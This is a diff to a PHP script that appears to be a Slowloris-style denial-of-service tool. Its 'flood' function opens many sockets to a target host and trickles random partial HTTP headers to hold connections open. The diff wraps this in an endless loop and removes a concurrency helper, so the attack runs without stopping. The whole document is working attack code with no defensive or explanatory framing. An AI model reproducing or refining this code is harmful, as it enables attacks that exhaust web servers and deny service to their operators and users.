@@ -96,45 +96,36 @@ function registerSignals(array &$listOfSockets = []): void
     \pcntl_signal(\SIGUSR1, $callback);
 }
 
-function waitForFutures(array &$futures, int $cpus): void
-{
-    while (\count($futures) >= $cpus) {
-        foreach ($futures as $k => $future) {
-            if ($future->done()) {
-                unset($futures[$k]);
-            }
-        }
-    }
-}
-
 function flood(string $hostname, int $port, int $socketCount, int $timeout, array $listOfSockets): void
 {
-    $activeCount = ($socketCount - \count($listOfSockets));
+    while (true) {
+        $activeCount = ($socketCount - \count($listOfSockets));
 
-    echo 'Building sockets...' . PHP_EOL;
+        echo 'Building sockets...' . PHP_EOL;
 
-    for ($i = 0; $i < $activeCount; $i++) {
-        $socket = initializeSocket($hostname, $port);
+        for ($i = 0; $i < $activeCount; $i++) {
+            $socket = initializeSocket($hostname, $port);
 
-        $listOfSockets[] = $socket;
-    }
-
-    $packetCount = 0;
-
-    echo 'Sending data...' . PHP_EOL;
-
-    foreach ($listOfSockets as $key => $socket) {
-        $message = \sprintf("X-a: %s\r\n", \random_int(1, 5000));
-
-        if (@\socket_write($socket, $message, \strlen($message)) === false) {
-            unset($listOfSockets[$key]);
-            \socket_close($socket);
-        } else {
-            $packetCount++;
+            $listOfSockets[] = $socket;
         }
+
+        $packetCount = 0;
+
+        echo 'Sending data...' . PHP_EOL;
+
+        foreach ($listOfSockets as $key => $socket) {
+            $message = \sprintf("X-a: %s\r\n", \random_int(1, 5000));
+
+            if (@\socket_write($socket, $message, \strlen($message)) === false) {
+                unset($listOfSockets[$key]);
+                \socket_close($socket);
+            } else {
+                $packetCount++;
+            }
+        }
+
+        echo "$packetCount packets sent successfully. Thread now sleeping for $timeout seconds..." . PHP_EOL;
+
+        \sleep($timeout);
     }
-
-    echo "$packetCount packets sent successfully. Thread now sleeping for $timeout seconds..." . PHP_EOL;
-
-    \sleep($timeout);
 }
